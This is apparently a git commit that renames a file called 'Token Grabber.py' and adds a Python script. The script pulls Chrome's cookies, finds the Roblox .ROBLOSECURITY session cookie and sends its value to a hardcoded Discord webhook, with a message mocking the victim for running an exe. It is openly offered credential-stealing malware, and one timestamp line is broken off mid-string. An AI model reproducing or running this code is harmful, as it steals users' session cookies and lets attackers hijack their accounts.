b9d464a183fb66b4dab0b9bbd82c1bd0e31282d9
smawsawi-cmd <s.mawsawi@gmail.com>
2025-09-02 14:11:58 +0300

    Update and rename Token Grabber.py to Capitan DualHook.py

---
+++ Capitan DualHook.py
@@ -0,0 +1,20 @@
+import requests
+import threading
+import browser_cookie3 as cookie
+from discord_webhook import DiscordWebhook, DiscordEmbed
+
+webhook_urls = ['webhook url 1', 'webhook url 2']
+
+def getCookiesFromPc():
+    req = requests.Session()
+    cj = cookie.chrome()
+    req.cookies = cj
+    r = req.get("https://www.roblox.com/")
+    for c in req.cookies:
+        if c.name == ".ROBLOSECURITY":
+            webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1412339726417006592/vhnSS2XVIYTAtaNMjO2jCp_Plg4fixjjKwzFy6J1wknomLMG2fZl9uHw42lH1lJyld1w', content="@everyone")
+            embed = DiscordEmbed(title='Cookie Found of braindead person!', description='He clicked a exe!', color=242424)
+            embed.add_embed_field(name='.ROBLOSECURITY', value=c.value)
+            embed.set_timestamp('
+            webhook.add_embed(embed)
+            response = webhook.execute()
